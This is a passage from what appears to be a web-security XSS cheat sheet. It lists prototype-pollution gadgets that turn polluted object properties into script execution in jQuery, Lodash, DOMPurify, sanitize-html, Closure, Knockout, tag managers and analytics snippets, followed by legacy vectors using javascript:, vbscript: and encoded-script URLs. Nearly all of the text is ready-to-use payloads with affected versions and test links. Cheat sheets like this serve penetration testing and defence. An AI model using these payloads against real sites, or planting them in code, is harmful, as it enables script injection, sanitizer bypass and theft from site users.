```](https://portswigger-labs.net/xss/xss.php?x=%3C%21--%20Start%20Framework%20code--%3E%3Cscript%2Fsrc%3Dhttps%3A%2F%2Fcode.jquery.com%2Fjquery-3.3.1.js%3E%3C%2Fscript%3E%0A%3C%21--End%20Framework%20code--%3E%0A%3Cscript%3E%0AObject.prototype.preventDefault%3D%27x%27%3B%0AObject.prototype.handleObj%3D%27x%27%3B%0AObject.prototype.delegateTarget%3D%27%3Cimg%2Fsrc%2Fonerror%3Dalert%281%29%3E%27%3B%0A%2F%2A%20No%20extra%20code%20needed%20for%20jQuery%201%20%26%202%20%2A%2F%24%28document%29.off%28%27foobar%27%29%3B%0A%3C%2Fscript%3E)\n\n[Sergey Bobrov](https://twitter.com/Black2Fan)\n\nAll versions\n\nreturn (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined')\n\n$(html) jQuery\n\n[``` <script> Object.prototype.div=['1','<img src onerror=alert(1)>','1'] </script><script> $('<div x=\"x\"></div>') </script> ```](https://portswigger-labs.net/xss/xss.php?x=%3C%21--%20Start%20Framework%20code--%3E%3Cscript%2Fsrc%3Dhttps%3A%2F%2Fcode.jquery.com%2Fjquery-3.3.1.js%3E%3C%2Fscript%3E%0A%3C%21--End%20Framework%20code--%3E%0A%3Cscript%3E%0AObject.prototype.div%3D%5B%271%27%2C%27%3Cimg%20src%20onerror%3Dalert%281%29%3E%27%2C%271%27%5D%0A%3C%2Fscript%3E%3Cscript%3E%0A%24%28%27%3Cdiv%20x%3D%22x%22%3E%3C%2Fdiv%3E%27%29%0A%3C%2Fscript%3E)\n\n[Sergey Bobrov](https://twitter.com/Black2Fan)\n\nAll versions\n\nreturn (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined')\n\n$.get jQuery\n\n[``` <script> Object.prototype.url = ['data:,alert(1)//']; Object.prototype.dataType = 'script'; </script> <script> $.get('https://google.com/'); $.post('https://google.com/'); </script> ```](https://portswigger-labs.net/xss/xss.php?x=%3C%21--%20Start%20Framework%20code--%3E%3Cscript%20src%3Dhttps%3A%2F%2Fcode.jquery.com%2Fjquery-3.5.1.js%3E%3C%2Fscript%3E%0A%3C%21--End%20Framework%20code--%3E%0A%3Cscript%3E%0AObject.prototype.url%20%3D%20%5B%27data%3A%2Calert%281%29%2F%2F%27%5D%3B%0AObject.prototype.dataType%20%3D%20%27script%27%3B%0A%3C%2Fscript%3E%0A%3Cscript%3E%0A%24.get%28%27https%3A%2F%2Fgoogle.com%2F%27%29%3B%0A%24.post%28%27https%3A%2F%2Fgoogle.com%2F%27%29%3B%0A%3C%2Fscript%3E)\n\n[Micha\u0142 Bentkowski](https://twitter.com/SecurityMB)\n\n\\>\\= 3.0.0\n\nreturn (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined')\n\n$.getScript jQuery\n\n[``` <script> Object.prototype.src = ['data:,alert(1)//'] </script> <script> $.getScript('https://google.com/') </script> ```](https://portswigger-labs.net/xss/xss.php?x=%3C%21--%20Start%20Framework%20code--%3E%3Cscript%20src%3Dhttps%3A%2F%2Fcode.jquery.com%2Fjquery-3.5.1.js%3E%3C%2Fscript%3E%0A%3C%21--End%20Framework%20code--%3E%0A%3Cscript%3E%0AObject.prototype.src%20%3D%20%5B%27data%3A%2Calert%281%29%2F%2F%27%5D%0A%3C%2Fscript%3E%0A%3Cscript%3E%0A%24.getScript%28%27https%3A%2F%2Fgoogle.com%2F%27%29%0A%3C%2Fscript%3E)\n\n[s1r1us](https://twitter.com/S1r1u5_)\n\n\\>\\= 3.4.0\n\nreturn (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined')\n\n$.getScript jQuery\n\n[``` <script> Object.prototype.url = 'data:,alert(1)//' </script> <script> $.getScript('https://google.com/') </script> ```](https://portswigger-labs.net/xss/xss.php?x=%3C%21--%20Start%20Framework%20code--%3E%3Cscript%2Fsrc%3Dhttps%3A%2F%2Fcode.jquery.com%2Fjquery-3.3.1.js%3E%3C%2Fscript%3E%0A%3C%21--End%20Framework%20code--%3E%0A%3Cscript%3E%0AObject.prototype.url%20%3D%20%27data%3A%2Calert%281%29%2F%2F%27%0A%3C%2Fscript%3E%0A%3Cscript%3E%0A%24.getScript%28%27https%3A%2F%2Fgoogle.com%2F%27%29%0A%3C%2Fscript%3E)\n\n[s1r1us](https://twitter.com/S1r1u5_)\n\n3.0.0 - 3.3.1\n\nreturn (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined')\n\nGoogle reCAPTCHA\n\n[``` <script> Object.prototype.srcdoc=['<script>alert(1)<\\/script>'] </script> <div class=\"g-recaptcha\" data-sitekey=\"your-site-key\"/> ```](https://portswigger-labs.net/xss/xss.php?x=%3C%21--%20Start%20Framework%20code--%3E%3Cscript%20src%3D%22https%3A%2F%2Fwww.google.com%2Frecaptcha%2Fapi.js%22%20async%20defer%3E%3C%2Fscript%3E%0A%3C%21--End%20Framework%20code--%3E%0A%3Cscript%3E%0AObject.prototype.srcdoc%3D%5B%27%3Cscript%3Ealert%281%29%3C%5C%2Fscript%3E%27%5D%0A%3C%2Fscript%3E%0A%3Cdiv%20class%3D%22g-recaptcha%22%20data-sitekey%3D%22your-site-key%22%2F%3E)\n\n[s1r1us](https://twitter.com/S1r1u5_)\n\nreturn (typeof recaptcha !== 'undefined')\n\nTwitter Universal Website Tag\n\n[``` <script> Object.prototype.hif = ['javascript:alert(document.domain)']; </script> ```](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3E%0AObject.prototype.hif%20%3D%20%5B%27javascript%3Aalert%28document.domain%29%27%5D%3B%0A%3C%2Fscript%3E%0A%3C%21--%20Start%20Framework%20code--%3E%3Cscript%3E%0A%21function%28e%2Ct%2Cn%2Cs%2Cu%2Ca%29%7Be.twq%7C%7C%28s%3De.twq%3Dfunction%28%29%7Bs.exe%3Fs.exe.apply%28s%2Carguments%29%3As.queue.push%28arguments%29%3B%0A%7D%2Cs.version%3D%271.1%27%2Cs.queue%3D%5B%5D%2Cu%3Dt.createElement%28n%29%2Cu.async%3D%210%2Cu.src%3D%27https%3A%2F%2Fstatic.ads-twitter.com%2Fuwt.js%27%2Ca%3Dt.getElementsByTagName%28n%29%5B0%5D%2Ca.parentNode.insertBefore%28u%2Ca%29%29%7D%28window%2Cdocument%2C%27script%27%29%3B%0A%0Atwq%28%27init%27%2C%27twitter_pixel_id%27%29%3Btwq%28%27track%27%2C%20%27PageView%27%29%3B%0A%3C%2Fscript%3E%0A%3C%21--End%20Framework%20code--%3E%0A)\n\n[Sergey Bobrov](https://twitter.com/Black2Fan)\n\nreturn (typeof twq !== 'undefined' && typeof twq.version !== 'undefined')\n\nTealium Universal Tag\n\n[``` <script> Object.prototype.attrs = {src:1}; Object.prototype.src='https://portswigger-labs.net/xss/xss.js' </script> ```](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3E%0AObject.prototype.attrs%20%3D%20%7Bsrc%3A1%7D%3B%0AObject.prototype.src%3D%27https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.js%27%0A%3C%2Fscript%3E%0A%3C%21--%20Start%20Framework%20code--%3E%3Cscript%20src%3Dhttps%3A%2F%2Ftags.tiqcdn.com%2Futag%2Ftealium-solutions%2Fmain%2Fprod%2Futag.js%3E%3C%2Fscript%3E%0A%3C%21--End%20Framework%20code--%3E%0A)\n\n[Sergey Bobrov](https://twitter.com/Black2Fan)\n\nreturn (typeof utag !== 'undefined' && typeof utag.id !== 'undefined')\n\nAkamai Boomerang\n\n[``` <script>Object.prototype.BOOMR = 1; Object.prototype.url='https://portswigger-labs.net/xss/xss.js'</script> ```](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3EObject.prototype.BOOMR%20%3D%201%3B%0AObject.prototype.url%3D%27https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.js%27%3C%2Fscript%3E%0A%3C%21--%20Start%20Framework%20code--%3E%3Cscript%20src%3Dhttps%3A%2F%2Fportswigger-labs.net%2Fxss%2Fboomerang.js%3E%3C%2Fscript%3E%0A%3C%21--End%20Framework%20code--%3E%0A)\n\n[s1r1us](https://twitter.com/S1r1u5_)\n\nreturn (typeof BOOMR !== 'undefined')\n\nLodash\n\n[``` <script> Object.prototype.sourceURL = '\\u2028\\u2029alert(1)' </script> <script> _.template('test') </script> ```](https://portswigger-labs.net/xss/xss.php?x=%3C%21--%20Start%20Framework%20code--%3E%3Cscript%2Fsrc%3D%22https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Flodash.js%2F4.17.15%2Flodash.min.js%22%3E%3C%2Fscript%3E%0A%3C%21--End%20Framework%20code--%3E%0A%3Cscript%3E%0AObject.prototype.sourceURL%20%3D%20%27%5Cu2028%5Cu2029alert%281%29%27%0A%3C%2Fscript%3E%0A%3Cscript%3E%0A_.template%28%27test%27%29%0A%3C%2Fscript%3E)\n\n[Alex Brasetvik](https://twitter.com/alexbrasetvik)\n\n<\\= 4.17.15\n\nreturn (typeof \\_ !== 'undefined' && typeof \\_.template !== 'undefined' && typeof \\_.VERSION !== 'undefined')\n\nsanitize-html\n\n[``` <script> Object.prototype['*'] = ['onload']</script> <script> document.write(sanitizeHtml('<iframe onload=alert(1)>')) </script> ```](https://portswigger-labs.net/xss/xss.php?x=%3C%21--%20Start%20Framework%20code--%3E%3Cscript%20src%3D%22https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Fsanitize-html%2F1.27.5%2Fsanitize-html.min.js%22%3E%3C%2Fscript%3E%0A%3C%21--End%20Framework%20code--%3E%0A%3Cscript%3E%0AObject.prototype%5B%27%2A%27%5D%20%3D%20%5B%27onload%27%5D%3C%2Fscript%3E%0A%3Cscript%3E%0Adocument.write%28sanitizeHtml%28%27%3Ciframe%20onload%3Dalert%281%29%3E%27%29%29%0A%3C%2Fscript%3E)\n\n[Micha\u0142 Bentkowski](https://twitter.com/SecurityMB)\n\nreturn (typeof sanitizeHtml !== 'undefined')\n\njs-xss\n\n[``` <script> Object.prototype.whiteList = {img: ['onerror', 'src']} </script> <script> document.write(filterXSS('<img src onerror=alert(1)>')) </script> ```](https://portswigger-labs.net/xss/xss.php?x=%3C%21--%20Start%20Framework%20code--%3E%3Cscript%20src%3D%22https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Fjs-xss%2F0.3.3%2Fxss.min.js%22%3E%3C%2Fscript%3E%0A%3C%21--End%20Framework%20code--%3E%0A%3Cscript%3E%0AObject.prototype.whiteList%20%3D%20%7Bimg%3A%20%5B%27onerror%27%2C%20%27src%27%5D%7D%0A%3C%2Fscript%3E%0A%3Cscript%3E%0Adocument.write%28filterXSS%28%27%3Cimg%20src%20onerror%3Dalert%281%29%3E%27%29%29%0A%3C%2Fscript%3E)\n\n[Micha\u0142 Bentkowski](https://twitter.com/SecurityMB)\n\nreturn (typeof filterXSS !== 'undefined')\n\nDOMPurify\n\n[``` <script> Object.prototype.ALLOWED_ATTR = ['onerror', 'src'] </script> <script> document.write(DOMPurify.sanitize('<img src onerror=alert(1)>')) </script> ```](https://portswigger-labs.net/xss/xss.php?x=%3C%21--%20Start%20Framework%20code--%3E%3Cscript%20src%3D%22https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Fdompurify%2F2.0.12%2Fpurify.min.js%22%3E%3C%2Fscript%3E%0A%3C%21--End%20Framework%20code--%3E%0A%3Cscript%3E%0AObject.prototype.ALLOWED_ATTR%20%3D%20%5B%27onerror%27%2C%20%27src%27%5D%0A%3C%2Fscript%3E%0A%3Cscript%3E%0Adocument.write%28DOMPurify.sanitize%28%27%3Cimg%20src%20onerror%3Dalert%281%29%3E%27%29%29%0A%3C%2Fscript%3E)\n\n[Micha\u0142 Bentkowski](https://twitter.com/SecurityMB)\n\n<\\= 2.0.12\n\nreturn (typeof DOMPurify !== 'undefined')\n\nDOMPurify\n\n[``` <script> Object.prototype.documentMode = 9 </script> ```](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3E%0AObject.prototype.documentMode%20%3D%209%0A%3C%2Fscript%3E%0A%3C%21--%20Start%20Framework%20code--%3E%3Cscript%20src%3D%22https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Fdompurify%2F2.0.12%2Fpurify.min.js%22%3E%3C%2Fscript%3E%0A%3Cscript%3E%0Adocument.write%28DOMPurify.sanitize%28%27%3Cimg%20src%20onerror%3Dalert%281%29%3E%27%29%29%0A%3C%2Fscript%3E%0A%3C%21--End%20Framework%20code--%3E%0A)\n\n[Micha\u0142 Bentkowski](https://twitter.com/SecurityMB)\n\n<\\= 2.0.12\n\nreturn (typeof DOMPurify !== 'undefined')\n\nClosure\n\n[``` <script> const html = '<img src onerror=alert(1)>'; const sanitizer = new goog.html.sanitizer.HtmlSanitizer(); const sanitized = sanitizer.sanitize(html); const node = goog.dom.safeHtmlToNode(sanitized); document.body.append(node); </script> ```](https://portswigger-labs.net/xss/xss.php?x=%3C%21--%20Start%20Framework%20code--%3E%3Cscript%3E%0AObject.prototype%5B%27%2A%20ONERROR%27%5D%20%3D%201%3B%0AObject.prototype%5B%27%2A%20SRC%27%5D%20%3D%201%3B%0A%3C%2Fscript%3E%0A%3Cscript%20src%3Dhttps%3A%2F%2Fgoogle.github.io%2Fclosure-library%2Fsource%2Fclosure%2Fgoog%2Fbase.js%3E%3C%2Fscript%3E%0A%3Cscript%3E%0Agoog.require%28%27goog.html.sanitizer.HtmlSanitizer%27%29%3B%0Agoog.require%28%27goog.dom%27%29%3B%0A%3C%2Fscript%3E%0A%0A%3C%21--End%20Framework%20code--%3E%0A%3Cscript%3E%0Aconst%20html%20%3D%20%27%3Cimg%20src%20onerror%3Dalert%281%29%3E%27%3B%0Aconst%20sanitizer%20%3D%20new%20goog.html.sanitizer.HtmlSanitizer%28%29%3B%0Aconst%20sanitized%20%3D%20sanitizer.sanitize%28html%29%3B%0Aconst%20node%20%3D%20goog.dom.safeHtmlToNode%28sanitized%29%3B%0A%0Adocument.body.append%28node%29%3B%0A%3C%2Fscript%3E)\n\n[Micha\u0142 Bentkowski](https://twitter.com/SecurityMB)\n\nreturn (typeof goog !== 'undefined' && typeof goog.basePath !== 'undefined')\n\nClosure\n\n[``` <script> Object.prototype.CLOSURE_BASE_PATH = 'data:,alert(1)//'; </script> ```](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3E%0AObject.prototype.CLOSURE_BASE_PATH%20%3D%20%27data%3A%2Calert%281%29%2F%2F%27%3B%0A%3C%2Fscript%3E%0A%3C%21--%20Start%20Framework%20code--%3E%3Cscript%20src%3Dhttps%3A%2F%2Fgoogle.github.io%2Fclosure-library%2Fsource%2Fclosure%2Fgoog%2Fbase.js%3E%3C%2Fscript%3E%0A%3Cscript%3E%0Agoog.require%28%27goog.html.sanitizer.HtmlSanitizer%27%29%3B%0Agoog.require%28%27goog.dom%27%29%3B%0A%3C%2Fscript%3E%0A%3C%21--End%20Framework%20code--%3E%0A)\n\n[Micha\u0142 Bentkowski](https://twitter.com/SecurityMB)\n\nreturn (typeof goog !== 'undefined' && typeof goog.basePath !== 'undefined')\n\nMarionette.js / Backbone.js\n\n[``` <script> Object.prototype.tagName = 'img' Object.prototype.src = ['x:x'] Object.prototype.onerror = ['alert(1)'] </script> <script> (function() { var View = Mn.View.extend({template: '#template-layout'}); var App = Mn.Application.extend({region: '#app', onStart: function() {this.showView(new View());}}); var app = new App(); app.start(); })(); </script> <div id=\"template-layout\" type=\"x-template/underscore\">xxx</div> ```](https://portswigger-labs.net/xss/xss.php?x=%3C%21--%20Start%20Framework%20code--%3E%3Cscript%20src%3D%22https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Fjquery%2F3.5.1%2Fjquery.min.js%22%3E%3C%2Fscript%3E%0A%3Cscript%20src%3D%22https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Funderscore.js%2F1.11.0%2Funderscore-min.js%22%3E%3C%2Fscript%3E%0A%3Cscript%20src%3D%22https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Fbackbone.js%2F1.4.0%2Fbackbone-min.js%22%3E%3C%2Fscript%3E%0A%3Cscript%20src%3D%22https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Fbackbone.marionette%2F4.1.2%2Fbackbone.marionette.min.js%22%3E%3C%2Fscript%3E%0A%3C%21--End%20Framework%20code--%3E%0A%3Cscript%3E%0AObject.prototype.tagName%20%3D%20%27img%27%0AObject.prototype.src%20%3D%20%5B%27x%3Ax%27%5D%0AObject.prototype.onerror%20%3D%20%5B%27alert%281%29%27%5D%0A%3C%2Fscript%3E%0A%3Cscript%3E%0A%28function%28%29%20%7B%0Avar%20View%20%3D%20Mn.View.extend%28%7Btemplate%3A%20%27%23template-layout%27%7D%29%3B%0Avar%20App%20%3D%20Mn.Application.extend%28%7Bregion%3A%20%27%23app%27%2C%20onStart%3A%20function%28%29%20%7Bthis.showView%28new%20View%28%29%29%3B%7D%7D%29%3B%0Avar%20app%20%3D%20new%20App%28%29%3B%0Aapp.start%28%29%3B%0A%7D%29%28%29%3B%0A%3C%2Fscript%3E%0A%3Cdiv%20id%3D%22template-layout%22%20type%3D%22x-template%2Funderscore%22%3Exxx%3C%2Fdiv%3E)\n\n[Sergey Bobrov](https://twitter.com/Black2Fan)\n\nreturn (typeof Marionette !== 'undefined') return (typeof Backbone !== 'undefined' && typeof Backbone.VERSION !== 'undefined')\n\nAdobe Dynamic Tag Management\n\n[``` <script> Object.prototype.src='data:,alert(1)//' </script> ```](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3E%0AObject.prototype.src%3D%27data%3A%2Calert%281%29%2F%2F%27%0A%3C%2Fscript%3E%0A%3C%21--%20Start%20Framework%20code--%3E%3Cscript%20src%3D%22https%3A%2F%2Fassets.adobedtm.com%2Flaunch-ENa21cfed3f06f4ddf9690de8077b39e81-development.min.js%22%20async%3E%3C%2Fscript%3E%0A%3C%21--End%20Framework%20code--%3E%0A)\n\n[Sergey Bobrov](https://twitter.com/Black2Fan)\n\nreturn (typeof \\_satellite !== 'undefined')\n\nEmbedly Cards\n\n[``` <script> Object.prototype.onload = 'alert(1)' </script> ```](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3E%0AObject.prototype.onload%20%3D%20%27alert%281%29%27%0A%3C%2Fscript%3E%0A%3C%21--%20Start%20Framework%20code--%3E%3Cblockquote%20class%3D%22reddit-card%22%20data-card-created%3D%221603396221%22%3E%0A%3Ca%20href%3D%22https%3A%2F%2Fwww.reddit.com%2Fr%2FSlackers%2Fcomments%2Fc5bfmb%2Fxss_challenge%2F%22%3EXSS%20Challenge%3C%2Fa%3E%0A%3C%2Fblockquote%3E%0A%3Cscript%20async%20src%3D%22https%3A%2F%2Fembed.redditmedia.com%2Fwidgets%2Fplatform.js%22%20charset%3D%22UTF-8%22%3E%3C%2Fscript%3E%0A%3C%21--End%20Framework%20code--%3E%0A)\n\n[Guilherme Keerok](https://twitter.com/k33r0k)\n\nreturn (typeof window.embedly !== 'undefined')\n\nSegment Analytics.js\n\n[``` <script> Object.prototype.script = [1,'<img/src/onerror=alert(1)>','<img/src/onerror=alert(2)>'] </script> ```](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3E%0AObject.prototype.script%20%3D%20%5B1%2C%27%3Cimg%2Fsrc%2Fonerror%3Dalert%281%29%3E%27%2C%27%3Cimg%2Fsrc%2Fonerror%3Dalert%282%29%3E%27%5D%0A%3C%2Fscript%3E%0A%3C%21--%20Start%20Framework%20code--%3E%3Cscript%20type%3D%22text%2Fjavascript%22%3E%0A%21function%28%29%7Bvar%20analytics%3Dwindow.analytics%3Dwindow.analytics%7C%7C%5B%5D%3Bif%28%21analytics.initialize%29if%28analytics.invoked%29window.console%26%26console.error%26%26console.error%28%22Segment%20snippet%20included%20twice.%22%29%3Belse%7Banalytics.invoked%3D%210%3Banalytics.methods%3D%5B%22trackSubmit%22%2C%22trackClick%22%2C%22trackLink%22%2C%22trackForm%22%2C%22pageview%22%2C%22identify%22%2C%22reset%22%2C%22group%22%2C%22track%22%2C%22ready%22%2C%22alias%22%2C%22debug%22%2C%22page%22%2C%22once%22%2C%22off%22%2C%22on%22%2C%22addSourceMiddleware%22%2C%22addIntegrationMiddleware%22%2C%22setAnonymousId%22%2C%22addDestinationMiddleware%22%5D%3Banalytics.factory%3Dfunction%28t%29%7Breturn%20function%28%29%7Bvar%20e%3DArray.prototype.slice.call%28arguments%29%3Be.unshift%28t%29%3Banalytics.push%28e%29%3Breturn%20analytics%7D%7D%3Bfor%28var%20t%3D0%3Bt%3Canalytics.methods.length%3Bt%2B%2B%29%7Bvar%20e%3Danalytics.methods%5Bt%5D%3Banalytics%5Be%5D%3Danalytics.factory%28e%29%7Danalytics.load%3Dfunction%28t%2Ce%29%7Bvar%20n%3Ddocument.createElement%28%22script%22%29%3Bn.type%3D%22text%2Fjavascript%22%3Bn.async%3D%210%3Bn.src%3D%22https%3A%2F%2Fcdn.segment.com%2Fanalytics.js%2Fv1%2F%22%2Bt%2B%22%2Fanalytics.min.js%22%3Bvar%20a%3Ddocument.getElementsByTagName%28%22script%22%29%5B0%5D%3Ba.parentNode.insertBefore%28n%2Ca%29%3Banalytics._loadOptions%3De%7D%3Banalytics.SNIPPET_VERSION%3D%224.1.0%22%3Banalytics.load%28%22platform%22%29%3Banalytics.page%28%29%3B%7D%7D%28%29%3B%3C%2Fscript%3E%0A%3C%21--End%20Framework%20code--%3E%0A)\n\n[Sergey Bobrov](https://twitter.com/Black2Fan)\n\nreturn (typeof analytics !== 'undefined' && typeof analytics.SNIPPET\\_VERSION !== 'undefined')\n\nKnockout.js\n\n[``` <strong data-bind=\"text:'hello'\"></strong> <script> Object.prototype[4]=\"a':1,[alert(1)]:1,'b\";Object.prototype[5]=','; </script><script> ko.applyBindings({}) </script> ```](https://portswigger-labs.net/xss/xss.php?x=%3C%21--%20Start%20Framework%20code--%3E%3Cscript%20src%3D%22https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Fknockout%2F3.5.0%2Fknockout-min.js%22%3E%3C%2Fscript%3E%0A%3C%21--End%20Framework%20code--%3E%0A%3Cstrong%20data-bind%3D%22text%3A%27hello%27%22%3E%3C%2Fstrong%3E%0A%3Cscript%3E%0AObject.prototype%5B4%5D%3D%22a%27%3A1%2C%5Balert%281%29%5D%3A1%2C%27b%22%3BObject.prototype%5B5%5D%3D%27%2C%27%3B%0A%3C%2Fscript%3E%3Cscript%3E%0Ako.applyBindings%28%7B%7D%29%0A%3C%2Fscript%3E)\n\n[Micha\u0142 Bentkowski](https://twitter.com/SecurityMB)\n\nClassic vectors (XSS crypt)\n---------------------------\n\nImage src with JavaScript protocol\n\n[`<img src=\"javascript:alert(1)\">`](https://portswigger-labs.net/xss/xss.php?x=%3Cimg%20src%3D%22javascript%3Aalert%281%29%22%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#image-src-with-javascript-protocol)\n\nBody background with JavaScript protocol\n\n[`<body background=\"javascript:alert(1)\">`](https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20background%3D%22javascript%3Aalert%281%29%22%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#body-background-with-javascript-protocol)\n\nIframe data urls no longer work as modern browsers use a null origin\n\n[`<iframe src=\"data:text/html,<img src=1 onerror=alert(document.domain)>\">`](https://portswigger-labs.net/xss/xss.php?x=%3Ciframe%20src%3D%22data%3Atext%2Fhtml%2C%3Cimg%20src%3D1%20onerror%3Dalert%28document.domain%29%3E%22%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#iframe-data-urls-no-longer-work-as-modern-browsers-use-a-null-origin)\n\nVBScript protocol used to work in IE\n\n[``` <a href=\"vbscript:MsgBox+1\">XSS</a> <a href=\"#\" onclick=\"vbs:Msgbox+1\">XSS</a> <a href=\"#\" onclick=\"VBS:Msgbox+1\">XSS</a> <a href=\"#\" onclick=\"vbscript:Msgbox+1\">XSS</a> <a href=\"#\" onclick=\"VBSCRIPT:Msgbox+1\">XSS</a> <a href=\"#\" language=vbs onclick=\"vbscript:Msgbox+1\">XSS</a> ```](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%22vbscript%3AMsgBox%2B1%22%3EXSS%3C%2Fa%3E%0A%3Ca%20href%3D%22%23%22%20onclick%3D%22vbs%3AMsgbox%2B1%22%3EXSS%3C%2Fa%3E%0A%3Ca%20href%3D%22%23%22%20onclick%3D%22VBS%3AMsgbox%2B1%22%3EXSS%3C%2Fa%3E%0A%3Ca%20href%3D%22%23%22%20onclick%3D%22vbscript%3AMsgbox%2B1%22%3EXSS%3C%2Fa%3E%0A%3Ca%20href%3D%22%23%22%20onclick%3D%22VBSCRIPT%3AMsgbox%2B1%22%3EXSS%3C%2Fa%3E%0A%3Ca%20href%3D%22%23%22%20language%3Dvbs%20onclick%3D%22vbscript%3AMsgbox%2B1%22%3EXSS%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vbscript-protocol-used-to-work-in-ie)\n\nJScript compact was a minimal version of JS that wasn't widely used in IE\n\n[``` <a href=\"#\" onclick=\"jscript.compact:alert(1);\">test</a> <a href=\"#\" onclick=\"JSCRIPT.COMPACT:alert(1);\">test</a> ```](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%22%23%22%20onclick%3D%22jscript.compact%3Aalert%281%29%3B%22%3Etest%3C%2Fa%3E%0A%3Ca%20href%3D%22%23%22%20onclick%3D%22JSCRIPT.COMPACT%3Aalert%281%29%3B%22%3Etest%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#jscript-compact-was-a-minimal-version-of-js-that-wasnt-widely-used-in-ie)\n\nJScript.Encode allows encoded JavaScript\n\n[``` <a href=# language=\"JScript.Encode\" onclick=\"#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@\">XSS</a> <a href=# onclick=\"JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@\">XSS</a> ```](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%23%20language%3D%22JScript.Encode%22%20onclick%3D%22%23%40~%5ECAAAAA%3D%3DC%5E%2B.D%608%23mgIAAA%3D%3D%5E%23~%40%22%3EXSS%3C%2Fa%3E%0A%3Ca%20href%3D%23%20onclick%3D%22JScript.Encode%3A%23%40~%5ECAAAAA%3D%3DC%5E%2B.D%608%23mgIAAA%3D%3D%5E%23~%40%22%3EXSS%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#jscriptencode-allows-encoded-javascript)\n\nVBScript.Encoded allows encoded VBScript\n\n[``` <iframe onload=VBScript.Encode:#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@> <iframe language=VBScript.Encode onload=#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@> ```](https://portswigger-labs.net/xss/xss.php?x=%3Ciframe%20onload%3DVBScript.Encode%3A%23%40~%5ECAAAAA%3D%3D%5Cko%24K6%2CFoQIAAA%3D%3D%5E%23~%40%3E%0A%3Ciframe%20language%3DVBScript.Encode%20onload%3D%23%40~%5ECAAAAA%3D%3D%5Cko%24K6%2CFoQIAAA%3D%3D%5E%23~%40%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vbscriptencoded-allows-encoded-vbscript)\n\nJavaScript entities used to work in Netscape Navigator\n\n[`<a title=\"&{alert(1)}\">XSS</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20title%3D%22%26%7Balert%281%29%7D%22%3EXSS%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#javascript-entities-used-to-work-in-netscape-navigator)\n\nJavaScript stylesheets used to be supported by Netscape Navigator\n\n[`<link href=\"xss.js\" rel=stylesheet type=\"text/javascript\">`](https://portswigger-labs.net/xss/xss.php?x=%3Clink%20href%3D%22xss.js%22%20rel%3Dstylesheet%20type%3D%22text%2Fjavascript%22%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#javascript-stylesheets-used-to-be-supported-by-netscape-navigator)\n\nButton used to consume markup\n\n[`<form><button name=x 